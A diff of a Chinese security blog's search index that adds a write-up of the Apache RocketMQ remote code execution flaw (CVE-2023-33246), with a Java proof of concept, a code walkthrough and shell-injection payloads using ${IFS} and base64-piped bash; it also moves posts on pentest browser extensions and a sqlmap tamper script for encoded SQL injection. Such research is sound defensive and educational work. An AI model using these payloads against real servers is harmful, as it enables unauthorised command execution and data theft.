@@ -1,6 +1,59 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）</title>
+    <url>/2023/08/01/Apache%20RocketMQ%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-33246%EF%BC%89/</url>
+    <content><![CDATA[<h3 id="1-漏洞介绍"><a href="#1-漏洞介绍" class="headerlink" title="1.漏洞介绍"></a>1.漏洞介绍</h3><p>Apache RocketMQ 存在远程命令执行漏洞(CVE-2023-33246)。RocketMQ的NameServer、Broker、Controller等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。</p>
+<h3 id="2-影响版本："><a href="#2-影响版本：" class="headerlink" title="2.影响版本："></a>2.影响版本：</h3><p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
+<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
+<h3 id="3-Idea配置"><a href="#3-Idea配置" class="headerlink" title="3.Idea配置"></a>3.Idea配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nameserver</span><br><span class="line">mainClass:org.apache.rocketmq.namesrv.NamesrvStartup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">broker</span><br><span class="line">mainClass:org.apache.rocketmq.broker.BrokerStartup</span><br><span class="line">arguments:-c F:\Code\Java\rocketmq\rocketmq\rocketmq-all-5.1.0\distribution\conf\broker.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>POC:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @ClassName RceTest</span><br><span class="line"> * @Description TODO</span><br><span class="line"> * @Date 2023/6/12 18:22</span><br><span class="line"> **/</span><br><span class="line"></span><br><span class="line">public class RceTest &#123;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void updateConfig() throws Exception&#123;</span><br><span class="line">        Properties properties = new Properties();</span><br><span class="line">        properties.setProperty(&quot;rocketmqHome&quot;, &quot;testtesttesttesttesttesttesttesttesttesttesttest&quot;);</span><br><span class="line">        properties.setProperty(&quot;filterServerNums&quot;,&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">        DefaultMQAdminExt adminExt = new DefaultMQAdminExt(60000);</span><br><span class="line">        adminExt.setNamesrvAddr(&quot;localhost:9876&quot;);</span><br><span class="line">        adminExt.start();</span><br><span class="line"></span><br><span class="line">        adminExt.updateBrokerConfig(&quot;127.0.0.1:10911&quot;,properties);</span><br><span class="line"></span><br><span class="line">        Properties brokerConfig = adminExt.getBrokerConfig(&quot;localhost:10911&quot;);</span><br><span class="line"></span><br><span class="line">        System.out.println(brokerConfig.getProperty(&quot;rocketmqHome&quot;));</span><br><span class="line">        System.out.println(brokerConfig.getProperty(&quot;filterServerNums&quot;));</span><br><span class="line">        adminExt.shutdown();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="4-漏洞调试"><a href="#4-漏洞调试" class="headerlink" title="4.漏洞调试"></a>4.漏洞调试</h3><h4 id="攻击路径："><a href="#攻击路径：" class="headerlink" title="攻击路径："></a>攻击路径：</h4><p>未授权访问NameServer（默认9876端口）和Broker（默认10911端口）–&gt;更新Broker配置文件中的rocketmqHome和filterServerNums–&gt;Broker加载配置文件中的rocketmqHome值并拼接进行命令执行</p>
+<p>更新broker配置文件，rocketmqHome中为要执行命令，filterServerNums设置为1是为了在createFilterServer使more不为0，从而进入下面的callshell方法</p>
+<p><img src="https://s2.loli.net/2023/08/01/BmAIvLPHr63EClY.png" alt="image-20230801144218365"></p>
+<p>linux下为应用根目录的distribution&#x2F;broker.conf文件</p>
+<p>windows下为应用根目录的distribution&#x2F;DefaultCluster_broker-a_0.properties文件</p>
+<p><img src="https://s2.loli.net/2023/08/01/w49VAQ5jOopgf2S.png" alt="image-20230801144240745"></p>
+<h4 id="broker："><a href="#broker：" class="headerlink" title="broker："></a>broker：</h4><p>BrokerStartup$main()，进入BrokerStartup$start()中的controller.start()</p>
+<p><img src="https://s2.loli.net/2023/08/01/fq4PnXceBE8LpQv.png" alt="image-20230801144656702"></p>
+<p>跟进进入startBasicService()，这个方法启动Broker各个组件，进入filterServerManager$start()方法</p>
+<p><img src="https://s2.loli.net/2023/08/01/npWgHxjudobEYTF.png" alt="image-20230801151110414"></p>
+<p>通过scheduleAtFixedRate()实现定时任务，每30秒执行一次</p>
+<p><img src="https://s2.loli.net/2023/08/01/yvaiLIU6J79wR8G.png" alt="image-20230801151347499"></p>
+<p>进入this.createFilterServer()，要保证more&gt;0，才能进入callShell()</p>
+<p><img src="https://s2.loli.net/2023/08/01/Po8iUsZ14GhB9K7.png" alt="image-20230801152942461"></p>
+<p>跟进this.buildStartCommand()方法拼接command，分别拼接了broker.conf文件、nameserver地址和startfsrv.sh(linux下)+broker.conf中rockermqhome的值</p>
+<p><img src="https://s2.loli.net/2023/08/01/46bQ2CUdfkv1hwl.png" alt="image-20230801153235692"></p>
+<p>最终命令被拼接成了”sh recketmqhome&#x2F;bin&#x2F;startfsrv.sh -c broker.conf -n nameserveraddress”</p>
+<p>跟进callShell方法，cmd命令被以空格分割为了数组，最终exec调用了cmdArray</p>
+<p><img src="https://s2.loli.net/2023/08/01/UnZxtWwHSl9EYuo.png" alt="image-20230801154505952"></p>
+<h4 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h4><p>windows未执行成功，没找到执行命令的方法</p>
+<h4 id="技巧："><a href="#技巧：" class="headerlink" title="技巧："></a>技巧：</h4><p>linux下有两种绕空格执行命令方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$@|sh . echo curl 127.0.0.1;</span><br><span class="line">$@作为一个特殊变量，它表示传递给脚本或命令的所有参数，直接将echo后面的值作为一个整体传递给$@，解决了拆分命令的问题。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-c bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&quot;&#123;echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;;</span><br><span class="line">使用$&#123;IFS&#125;绕过空格</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="5-参考"><a href="#5-参考" class="headerlink" title="5.参考"></a>5.参考</h3><p><a href="https://paper.seebug.org/2081/">https://paper.seebug.org/2081/</a></p>
+]]></content>
+      <categories>
+        <category>Java代码审计</category>
+      </categories>
+      <tags>
+        <tag>Apache RocketMQ</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Confluence OGNL表达式注入命令执行- CVE-2022-26134</title>
     <url>/2022/06/06/Confluence%20OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%20CVE-2022-26134/</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。使用简单，可以用于企业团队共享信息、文档协作、集体讨论，信息推送。</p>
@@ -30,6 +83,54 @@
       </categories>
       <tags>
         <tag>Confluence</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Chrome插件</title>
+    <url>/2023/02/10/Chrome%E6%8F%92%E4%BB%B6/</url>
+    <content><![CDATA[<h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="start-me"><a href="#start-me" class="headerlink" title="start.me"></a>start.me</h4><p>自定义首页标签等</p>
+<p><img src="https://s2.loli.net/2023/02/10/Dl84mrZP5CuL36q.png" alt="image-20230209135746231"></p>
+<h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a>Tampermonkey</h4><p>油猴脚本，功能强大！</p>
+<p>各大视频无需会员解析、CSDN免登录查看全文、百度文库复制等等</p>
+<p><img src="https://s2.loli.net/2023/02/10/d1YI7DlgeQCTMKw.png" alt="image-20230209135844651"></p>
+<h4 id="二维码（生成及识别）"><a href="#二维码（生成及识别）" class="headerlink" title="二维码（生成及识别）"></a>二维码（生成及识别）</h4><p>识别和生成二维码，不再需要手机扫描</p>
+<h4 id="charset"><a href="#charset" class="headerlink" title="charset"></a><strong>charset</strong></h4><p>解决某些页面展示乱码问题，火狐浏览器工具栏自带修复编码功能</p>
+<p><img src="https://s2.loli.net/2023/02/09/vqtB1EC4gNlsTcy.png" alt="image-20230209133729105"></p>
+<h4 id="JavaScript-and-CSS-Code-Beautifier"><a href="#JavaScript-and-CSS-Code-Beautifier" class="headerlink" title="JavaScript and CSS Code Beautifier"></a>JavaScript and CSS Code Beautifier</h4><p>美化前端js、css展示，方便调试前端</p>
+<p><img src="https://s2.loli.net/2023/02/09/jMJwQKOn7mH8o93.png" alt="image-20230209135312709"></p>
+<h4 id="JSONView"><a href="#JSONView" class="headerlink" title="JSONView"></a>JSONView</h4><p>chrome默认展示json无格式，此插件可以展示json的树形结构</p>
+<h4 id="Save-as-MHTML"><a href="#Save-as-MHTML" class="headerlink" title="Save as MHTML"></a>Save as MHTML</h4><p>推荐，打包页面到本地，不用再担心文章被删除了</p>
+<p><img src="https://s2.loli.net/2023/02/09/SRZtNksTqeOW6LM.png" alt="image-20230209135640469"></p>
+<h3 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h3><h4 id="hack-tools"><a href="#hack-tools" class="headerlink" title="hack-tools"></a><strong>hack-tools</strong></h4><p>常用的渗透payload</p>
+<p><img src="https://s2.loli.net/2023/02/09/vwuz2B8YlXQ3CKo.png" alt="image-20230209134106245"></p>
+<h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a><strong>hackbar</strong></h4><p>有了burp很少用了</p>
+<p><img src="https://s2.loli.net/2023/02/09/T6yB5hdlIN27zOD.png" alt="image-20230209135004830"></p>
+<h4 id="ie-tab"><a href="#ie-tab" class="headerlink" title="ie tab"></a><strong>ie tab</strong></h4><p>ie无法使用情况下的chrome替代插件</p>
+<p><img src="https://s2.loli.net/2023/02/09/JqXxVYNlktgEH65.png" alt="image-20230209135121881"></p>
+<h4 id="User-Agent-Switcher"><a href="#User-Agent-Switcher" class="headerlink" title="User-Agent Switcher"></a>User-Agent Switcher</h4><p>User-Agent Switcher and Manager</p>
+<p>User-Agent Switcher for Chrome</p>
+<p>修改页面ua</p>
+<p><img src="https://s2.loli.net/2023/02/09/pC7Luiej9yTtEgv.png" alt="image-20230209140155721"></p>
+<h4 id="WebSocket-Test-Client"><a href="#WebSocket-Test-Client" class="headerlink" title="WebSocket Test Client"></a>WebSocket Test Client</h4><p>WebSocket测试客户端</p>
+<p><img src="C:\Users\meng\AppData\Roaming\Typora\typora-user-images\image-20230209140249520.png" alt="image-20230209140249520"></p>
+<h4 id="SwitchyOmega"><a href="#SwitchyOmega" class="headerlink" title="SwitchyOmega"></a><strong>SwitchyOmega</strong></h4><p>现在用的比较少了，一般情况下直接用burp内置的浏览器，但是像测试越权等需要开两个页面的场景，还是很好用的</p>
+<p><img src="https://s2.loli.net/2023/02/09/UBDo5PewayWgZEV.png" alt="image-20230209133556244"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="FindSomething"><a href="#FindSomething" class="headerlink" title="FindSomething"></a><strong>FindSomething</strong></h4><p>从前端发现敏感信息</p>
+<p><img src="https://s2.loli.net/2023/02/09/uRad5Nh4QAL1P72.png" alt="image-20230209134550266"></p>
+<h4 id="hunter-snov"><a href="#hunter-snov" class="headerlink" title="hunter snov"></a><strong>hunter</strong> snov</h4><p>邮箱收集，推荐snov</p>
+<p><img src="https://s2.loli.net/2023/02/09/VJwrXdZW8t1cNCU.png" alt="image-20230209134705350"></p>
+<h4 id="IP-域名信息查看"><a href="#IP-域名信息查看" class="headerlink" title="IP 域名信息查看"></a><strong>IP 域名信息查看</strong></h4><p>查看IP、域名信息</p>
+<p><img src="https://s2.loli.net/2023/02/09/18Qmdn7BuNEWsY6.png" alt="image-20230209134755621"></p>
+<h4 id="fofa-pro-view"><a href="#fofa-pro-view" class="headerlink" title="fofa pro view"></a><strong>fofa pro view</strong></h4><p>fofa浏览器插件</p>
+<p><img src="https://s2.loli.net/2023/02/09/Xg2WyKpQS78cZhm.png" alt="image-20230209134905611"></p>
+<h3 id="github相关"><a href="#github相关" class="headerlink" title="github相关"></a>github相关</h3><h4 id="GitZip-for-github"><a href="#GitZip-for-github" class="headerlink" title="GitZip for github"></a><strong>GitZip for github</strong></h4><p>下载github单个文件或文件夹</p>
+<p><img src="https://s2.loli.net/2023/02/09/YkVTqRehfblowE8.png" alt="image-20230209133935758"></p>
+]]></content>
+      <categories>
+        <category>插件</category>
+      </categories>
+      <tags>
+        <tag>Chrome</tag>
       </tags>
   </entry>
   <entry>
@@ -124,54 +225,6 @@
       </categories>
       <tags>
         <tag>Hexo&amp;Next</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Chrome插件</title>
-    <url>/2023/02/10/Chrome%E6%8F%92%E4%BB%B6/</url>
-    <content><![CDATA[<h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="start-me"><a href="#start-me" class="headerlink" title="start.me"></a>start.me</h4><p>自定义首页标签等</p>
-<p><img src="https://s2.loli.net/2023/02/10/Dl84mrZP5CuL36q.png" alt="image-20230209135746231"></p>
-<h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a>Tampermonkey</h4><p>油猴脚本，功能强大！</p>
-<p>各大视频无需会员解析、CSDN免登录查看全文、百度文库复制等等</p>
-<p><img src="https://s2.loli.net/2023/02/10/d1YI7DlgeQCTMKw.png" alt="image-20230209135844651"></p>
-<h4 id="二维码（生成及识别）"><a href="#二维码（生成及识别）" class="headerlink" title="二维码（生成及识别）"></a>二维码（生成及识别）</h4><p>识别和生成二维码，不再需要手机扫描</p>
-<h4 id="charset"><a href="#charset" class="headerlink" title="charset"></a><strong>charset</strong></h4><p>解决某些页面展示乱码问题，火狐浏览器工具栏自带修复编码功能</p>
-<p><img src="https://s2.loli.net/2023/02/09/vqtB1EC4gNlsTcy.png" alt="image-20230209133729105"></p>
-<h4 id="JavaScript-and-CSS-Code-Beautifier"><a href="#JavaScript-and-CSS-Code-Beautifier" class="headerlink" title="JavaScript and CSS Code Beautifier"></a>JavaScript and CSS Code Beautifier</h4><p>美化前端js、css展示，方便调试前端</p>
-<p><img src="https://s2.loli.net/2023/02/09/jMJwQKOn7mH8o93.png" alt="image-20230209135312709"></p>
-<h4 id="JSONView"><a href="#JSONView" class="headerlink" title="JSONView"></a>JSONView</h4><p>chrome默认展示json无格式，此插件可以展示json的树形结构</p>
-<h4 id="Save-as-MHTML"><a href="#Save-as-MHTML" class="headerlink" title="Save as MHTML"></a>Save as MHTML</h4><p>推荐，打包页面到本地，不用再担心文章被删除了</p>
-<p><img src="https://s2.loli.net/2023/02/09/SRZtNksTqeOW6LM.png" alt="image-20230209135640469"></p>
-<h3 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h3><h4 id="hack-tools"><a href="#hack-tools" class="headerlink" title="hack-tools"></a><strong>hack-tools</strong></h4><p>常用的渗透payload</p>
-<p><img src="https://s2.loli.net/2023/02/09/vwuz2B8YlXQ3CKo.png" alt="image-20230209134106245"></p>
-<h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a><strong>hackbar</strong></h4><p>有了burp很少用了</p>
-<p><img src="https://s2.loli.net/2023/02/09/T6yB5hdlIN27zOD.png" alt="image-20230209135004830"></p>
-<h4 id="ie-tab"><a href="#ie-tab" class="headerlink" title="ie tab"></a><strong>ie tab</strong></h4><p>ie无法使用情况下的chrome替代插件</p>
-<p><img src="https://s2.loli.net/2023/02/09/JqXxVYNlktgEH65.png" alt="image-20230209135121881"></p>
-<h4 id="User-Agent-Switcher"><a href="#User-Agent-Switcher" class="headerlink" title="User-Agent Switcher"></a>User-Agent Switcher</h4><p>User-Agent Switcher and Manager</p>
-<p>User-Agent Switcher for Chrome</p>
-<p>修改页面ua</p>
-<p><img src="https://s2.loli.net/2023/02/09/pC7Luiej9yTtEgv.png" alt="image-20230209140155721"></p>
-<h4 id="WebSocket-Test-Client"><a href="#WebSocket-Test-Client" class="headerlink" title="WebSocket Test Client"></a>WebSocket Test Client</h4><p>WebSocket测试客户端</p>
-<p><img src="C:\Users\meng\AppData\Roaming\Typora\typora-user-images\image-20230209140249520.png" alt="image-20230209140249520"></p>
-<h4 id="SwitchyOmega"><a href="#SwitchyOmega" class="headerlink" title="SwitchyOmega"></a><strong>SwitchyOmega</strong></h4><p>现在用的比较少了，一般情况下直接用burp内置的浏览器，但是像测试越权等需要开两个页面的场景，还是很好用的</p>
-<p><img src="https://s2.loli.net/2023/02/09/UBDo5PewayWgZEV.png" alt="image-20230209133556244"></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="FindSomething"><a href="#FindSomething" class="headerlink" title="FindSomething"></a><strong>FindSomething</strong></h4><p>从前端发现敏感信息</p>
-<p><img src="https://s2.loli.net/2023/02/09/uRad5Nh4QAL1P72.png" alt="image-20230209134550266"></p>
-<h4 id="hunter-snov"><a href="#hunter-snov" class="headerlink" title="hunter snov"></a><strong>hunter</strong> snov</h4><p>邮箱收集，推荐snov</p>
-<p><img src="https://s2.loli.net/2023/02/09/VJwrXdZW8t1cNCU.png" alt="image-20230209134705350"></p>
-<h4 id="IP-域名信息查看"><a href="#IP-域名信息查看" class="headerlink" title="IP 域名信息查看"></a><strong>IP 域名信息查看</strong></h4><p>查看IP、域名信息</p>
-<p><img src="https://s2.loli.net/2023/02/09/18Qmdn7BuNEWsY6.png" alt="image-20230209134755621"></p>
-<h4 id="fofa-pro-view"><a href="#fofa-pro-view" class="headerlink" title="fofa pro view"></a><strong>fofa pro view</strong></h4><p>fofa浏览器插件</p>
-<p><img src="https://s2.loli.net/2023/02/09/Xg2WyKpQS78cZhm.png" alt="image-20230209134905611"></p>
-<h3 id="github相关"><a href="#github相关" class="headerlink" title="github相关"></a>github相关</h3><h4 id="GitZip-for-github"><a href="#GitZip-for-github" class="headerlink" title="GitZip for github"></a><strong>GitZip for github</strong></h4><p>下载github单个文件或文件夹</p>
-<p><img src="https://s2.loli.net/2023/02/09/YkVTqRehfblowE8.png" alt="image-20230209133935758"></p>
-]]></content>
-      <categories>
-        <category>插件</category>
-      </categories>
-      <tags>
-        <tag>Chrome</tag>
       </tags>
   </entry>
   <entry>
@@ -305,47 +358,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Sqlmap tamper</title>
-    <url>/2022/03/28/sqlmap_tamper/</url>
-    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
-<li>tamper<ul>
-<li>sqlmap中的模块，用于自定义编码payload绕过防护设备</li>
-<li>本文使用tamper并不是为了绕过防护设备，而是服务端只接收编码后的数据，对于未编码的数据不会接收</li>
-</ul>
-</li>
-<li>查找加密算法，姿势很多，能找到就行，本次环境为rc4+base64+url编码</li>
-<li>js2py库，用于使用python调用js</li>
-</ul>
-<h2 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h2><ol>
-<li>需要调用外部js，即获取到的js加密代码</li>
-</ol>
-<p><img src="https://s2.loli.net/2022/03/31/r8EdeJgCZKm7fSG.png"></p>
-<ol start="2">
-<li><p>js2py库，用于调用js</p>
-<p>​	这里遇到了一些问题，开始使用的方法是<code>eval_js()</code>，但是该方法只能调用单函数js文件，遇到多函数的js文件会调用最后一个函数</p>
-<p>​	<code>EvalJs()</code>，可以执行多函数js代码，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(&#x27;./get_key.js&#x27;) as fp:</span><br><span class="line">20     js = fp.read()</span><br><span class="line">21     # ctx2 = execjs.compile(js)</span><br><span class="line">22     context = js2py.EvalJs()</span><br><span class="line">23     context.execute(js)</span><br><span class="line">24     vl5x=context.getKey(cookie)		//getKey是get_key.js中的方法，如果要调用其他方法，例如context.main即调用main方法</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>payload处理</p>
-</li>
-</ol>
-<p>​			存在注入的参数要求必须有一个正确的可查到的的参数值，但是这个值也需要编码，放在数据包里面是肯定的不行的，因为包里面的数据不会通过tamper进行处理，所以只能通过tamper把payload进行处理，直接赋值个payload一个固定的值，并且一同调用js进行加密</p>
-<p><img src="https://s2.loli.net/2022/03/31/1mkMIbg3NzKjWqV.png"></p>
-<ol start="4">
-<li>到这里思路基本理清楚了，原参数–&gt;调用tamper–&gt;payload加密–&gt;sqlmap测试，具体代码如下：</li>
-</ol>
-<p><img src="https://s2.loli.net/2022/03/31/zkaPcuvxi41nhw2.png"></p>
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><code>sqlmap -r .\11.txt -p &quot;xxx&quot; --tamper=test.py --dbms=mssql --force-ssl --proxy=http://127.0.0.1:8080</code></p>
-<p><img src="https://s2.loli.net/2022/03/31/HhA1W5ZO7BxiDeM.png"></p>
-]]></content>
-      <categories>
-        <category>渗透技巧</category>
-      </categories>
-      <tags>
-        <tag>Sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>frida hook初探</title>
     <url>/2022/04/22/frida%20hook/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间趁着项目较少，把APP编写和frida简单hook进行了一些学习，不过毕竟java底子比较薄弱，学习过程还是遇到了一些问题，在此进行一些记录</p>
@@ -403,6 +415,47 @@
       </categories>
       <tags>
         <tag>frida</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sqlmap tamper</title>
+    <url>/2022/03/28/sqlmap_tamper/</url>
+    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
+<li>tamper<ul>
+<li>sqlmap中的模块，用于自定义编码payload绕过防护设备</li>
+<li>本文使用tamper并不是为了绕过防护设备，而是服务端只接收编码后的数据，对于未编码的数据不会接收</li>
+</ul>
+</li>
+<li>查找加密算法，姿势很多，能找到就行，本次环境为rc4+base64+url编码</li>
+<li>js2py库，用于使用python调用js</li>
+</ul>
+<h2 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h2><ol>
+<li>需要调用外部js，即获取到的js加密代码</li>
+</ol>
+<p><img src="https://s2.loli.net/2022/03/31/r8EdeJgCZKm7fSG.png"></p>
+<ol start="2">
+<li><p>js2py库，用于调用js</p>
+<p>​	这里遇到了一些问题，开始使用的方法是<code>eval_js()</code>，但是该方法只能调用单函数js文件，遇到多函数的js文件会调用最后一个函数</p>
+<p>​	<code>EvalJs()</code>，可以执行多函数js代码，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(&#x27;./get_key.js&#x27;) as fp:</span><br><span class="line">20     js = fp.read()</span><br><span class="line">21     # ctx2 = execjs.compile(js)</span><br><span class="line">22     context = js2py.EvalJs()</span><br><span class="line">23     context.execute(js)</span><br><span class="line">24     vl5x=context.getKey(cookie)		//getKey是get_key.js中的方法，如果要调用其他方法，例如context.main即调用main方法</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>payload处理</p>
+</li>
+</ol>
+<p>​			存在注入的参数要求必须有一个正确的可查到的的参数值，但是这个值也需要编码，放在数据包里面是肯定的不行的，因为包里面的数据不会通过tamper进行处理，所以只能通过tamper把payload进行处理，直接赋值个payload一个固定的值，并且一同调用js进行加密</p>
+<p><img src="https://s2.loli.net/2022/03/31/1mkMIbg3NzKjWqV.png"></p>
+<ol start="4">
+<li>到这里思路基本理清楚了，原参数–&gt;调用tamper–&gt;payload加密–&gt;sqlmap测试，具体代码如下：</li>
+</ol>
+<p><img src="https://s2.loli.net/2022/03/31/zkaPcuvxi41nhw2.png"></p>
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><code>sqlmap -r .\11.txt -p &quot;xxx&quot; --tamper=test.py --dbms=mssql --force-ssl --proxy=http://127.0.0.1:8080</code></p>
+<p><img src="https://s2.loli.net/2022/03/31/HhA1W5ZO7BxiDeM.png"></p>
+]]></content>
+      <categories>
+        <category>渗透技巧</category>
+      </categories>
+      <tags>
+        <tag>Sqlmap</tag>
       </tags>
   </entry>
 </search>
